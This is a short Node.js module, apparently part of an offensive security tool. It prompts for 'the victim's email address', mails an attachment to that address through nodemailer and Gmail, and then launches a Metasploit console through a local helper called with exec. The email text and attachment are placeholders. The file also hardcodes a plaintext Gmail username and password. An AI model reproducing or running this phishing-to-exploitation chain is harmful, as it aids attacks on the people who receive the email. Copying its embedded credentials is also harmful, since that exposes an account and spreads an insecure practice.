const nodemailer = require("nodemailer");
const openConsole = require("./OpenMsfConsole");
const inquirer = require("inquirer");
const exec = require("child_process").exec;

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: "johnbrowncsg@gmail.com",
    pass: "Johnbrowncsg123",
  },
});

exports.emailPrompt = (address) => {
  inquirer
    .prompt([
      {
        type: "input",
        message: "Enter the victim's email address",
        name: "email",
      },
    ])
    .then((answers) => {
      var message = {
        from: "test@test.com",
        to: answers.email,
        subject: "Test email subject",
        html: "<h1>Test email header</h1><p>Test email body<b>",
        attachments: [
          {
            filename: "your-testla.png",
            path: "src/assets/utechlogo.png",
          },
        ],
      };

      transporter.sendMail(message, (error, info) => {
        if (error) {
          console.log(error);
        }
        console.log("Info", info);
        openConsole.openConsole(exec, address);
      });
    });
};
